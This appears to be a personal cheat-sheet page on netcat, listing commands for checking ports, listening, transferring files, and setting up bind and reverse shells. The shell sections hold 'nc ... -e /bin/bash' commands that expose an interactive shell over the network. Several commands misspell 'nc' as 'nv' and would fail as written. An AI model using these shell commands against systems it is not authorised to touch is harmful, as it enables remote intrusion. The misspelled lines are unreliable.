---
title: "netcat"
linkTitle: "netcat"
date: 2017-01-05
---

### Check open port

```bash
nc -vz 1.1.1.1 53
nc -vnz 1.1.1.1 53
```

### Listen

```bash
nv -lnvp 1234
```

on localhost:

```bash
nc -nv -l 127.0.0.1 -p 1234
```

### Transfer

Alice -> Bob

Bob:

```bash
nv -lnvp 1234 > file
```

Alice:

```bash
nv -nv 192.168.1.1 1234 < file
```

### Bind shell

Alice -> Bob

Bob:

```bash
nc -nv -l 127.0.0.1 1234 -e /bin/bash
```

Alice:

```bash
nc -nv 127.0.0.1 1234
```

### Reverse shell

Alice -> Bob -> Alice

Bob:

```bash
nc -nv -l 127.0.0.1 1234
```

Alice:

```bash
nc -nv 127.0.0.1 1234 -e /bin/bash
```
